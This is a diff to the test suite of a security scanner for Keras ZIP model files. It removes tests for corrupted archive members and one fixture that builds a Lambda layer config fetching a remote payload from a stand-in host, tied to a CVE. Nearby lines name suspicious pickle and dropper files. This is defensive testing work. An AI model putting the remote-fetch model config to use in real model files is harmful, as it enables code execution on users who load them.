@@ -60,14 +60,6 @@ def _build_test_keras_zip(config: dict[str, Any] | str, tmp_path: Path, keras_ve
     return str(keras_path)
 
 
-def _corrupt_stored_member_contents(archive_path: Path, original_contents: bytes) -> None:
-    """Corrupt a stored ZIP member payload without invalidating the central directory."""
-    archive_bytes = bytearray(archive_path.read_bytes())
-    payload_offset = archive_bytes.index(original_contents)
-    archive_bytes[payload_offset] ^= 0x01
-    archive_path.write_bytes(archive_bytes)
-
-
 def _assert_inconclusive_keras_zip_scan(model_path: Path, reason: str, expected_check_name: str) -> None:
     result = KerasZipScanner().scan(str(model_path))
 
@@ -556,85 +548,6 @@ class TestKerasZipScanner:
         )
         result = KerasZipScanner().scan(str(keras_path))
         assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
-
-    def test_corrupt_config_member_is_inconclusive_and_uncached(self, tmp_path: Path) -> None:
-        """A CRC-corrupt Keras config is incomplete coverage, not a security finding."""
-        keras_path = tmp_path / "corrupt_config.keras"
-        config_bytes = json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode()
-        with zipfile.ZipFile(keras_path, "w", compression=zipfile.ZIP_STORED) as zf:
-            zf.writestr("config.json", config_bytes)
-        _corrupt_stored_member_contents(keras_path, config_bytes)
-
-        direct_result = KerasZipScanner().scan(str(keras_path))
-
-        assert KerasZipScanner.can_handle(str(keras_path))
-        assert direct_result.success is False
-        assert direct_result.has_errors is False
-        assert direct_result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
-        assert "keras_zip_archive_read_failed" in direct_result.metadata["scan_outcome_reasons"]
-        assert any(check.name == "Keras ZIP Archive Read" for check in direct_result.checks)
-        assert not any(
-            issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in direct_result.issues
-        )
-
-        cache_dir = tmp_path / "cache"
-        reset_cache_manager()
-        try:
-            first_result = scan_model_directory_or_file(
-                str(keras_path),
-                cache_enabled=True,
-                cache_dir=str(cache_dir),
-                min_cache_file_size=0,
-            )
-            second_result = scan_model_directory_or_file(
-                str(keras_path),
-                cache_enabled=True,
-                cache_dir=str(cache_dir),
-                min_cache_file_size=0,
-            )
-
-            for result in (first_result, second_result):
-                metadata = result.file_metadata[str(keras_path)]
-                assert determine_exit_code(result) == 2
-                assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
-                assert "keras_zip_archive_read_failed" in metadata.get("scan_outcome_reasons")
-                assert not any(
-                    issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues
-                )
-
-            assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
-        finally:
-            reset_cache_manager()
-
-    def test_corrupt_metadata_member_preserves_security_finding(self, tmp_path: Path) -> None:
-        """A later archive-read failure must not erase detected Keras CVE evidence."""
-        keras_path = tmp_path / "malicious_with_corrupt_metadata.keras"
-        config_bytes = json.dumps(
-            [
-                {
-                    "class_name": "Lambda",
-                    "config": {
-                        "fn": "get_file",
-                        "kwargs": {"origin": "https://example.invalid/payload.py"},
-                    },
-                }
-            ]
-        ).encode()
-        metadata_bytes = json.dumps({"keras_version": "3.13.2"}).encode()
-        with zipfile.ZipFile(keras_path, "w", compression=zipfile.ZIP_STORED) as zf:
-            zf.writestr("config.json", config_bytes)
-            zf.writestr("metadata.json", metadata_bytes)
-        _corrupt_stored_member_contents(keras_path, metadata_bytes)
-
-        result = KerasZipScanner().scan(str(keras_path))
-        aggregate_result = scan_model_directory_or_file(str(keras_path), config={"cache_scan_results": False})
-
-        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-8747"]
-        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
-        assert "keras_zip_archive_read_failed" in result.metadata["scan_outcome_reasons"]
-        assert len(cve_issues) == 1
-        assert cve_issues[0].severity == IssueSeverity.CRITICAL
-        assert determine_exit_code(aggregate_result) == 1
 
     def test_inconclusive_compile_config_preserves_security_exit1(self, tmp_path: Path) -> None:
         """Security findings should still take precedence over incomplete compile_config analysis."""
@@ -1786,26 +1699,6 @@ __import__('pickle').loads(data)
             "payload.COM",
             "dropper.PS1",
         }.issubset(suspicious_filenames)
-
-    def test_attacker_controlled_member_names_preserve_hazard_rule_codes(self, tmp_path: Path) -> None:
-        archive_path = tmp_path / "named_members.keras"
-        config = {"class_name": "Sequential", "config": {"layers": []}}
-        with zipfile.ZipFile(archive_path, "w") as zf:
-            zf.writestr("config.json", json.dumps(config))
-            zf.writestr("pickle_payload.py", "value = 1\n")
-            zf.writestr("pickle_payload.exe", b"not executed")
-
-        result = KerasZipScanner().scan(str(archive_path))
-
-        python_checks = [check for check in result.checks if check.name == "Python File Detection"]
-        executable_checks = [check for check in result.checks if check.name == "Executable File Detection"]
-        assert len(python_checks) == 1
-        assert python_checks[0].rule_code == "S507"
-        assert len(executable_checks) == 1
-        assert executable_checks[0].severity == IssueSeverity.CRITICAL
-        assert executable_checks[0].rule_code == "S501"
-        assert not [check for check in result.checks if check.rule_code == "S213"]
-        assert determine_exit_code(scan_model_directory_or_file(str(archive_path), cache_enabled=False)) == 1
 
     def test_executable_extension_near_matches_stay_clean(self, tmp_path: Path) -> None:
         """Executable extension near matches should not be treated as executable archive members."""
